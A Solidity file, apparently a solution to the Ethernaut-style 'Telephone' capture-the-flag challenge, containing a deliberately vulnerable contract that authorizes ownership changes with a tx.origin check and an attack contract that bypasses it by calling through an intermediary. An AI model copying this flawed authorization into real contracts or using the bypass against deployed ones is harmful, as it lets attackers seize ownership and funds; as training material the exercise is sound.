// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";
/**
 * 本次挑战是要求获得Telephone合约的所有权
 */
contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
    console.log("tx.origin", tx.origin);
    console.log("msg.sender", msg.sender);
    console.log("_owner", _owner);
    console.log("owner", owner);
  }
}


contract AttactTelephone {
    Telephone telephone;
    constructor(Telephone _telephone){
        telephone = _telephone;
    }

    function attactChangeOwner(address _owner) public{
        telephone.changeOwner(_owner);
    }
}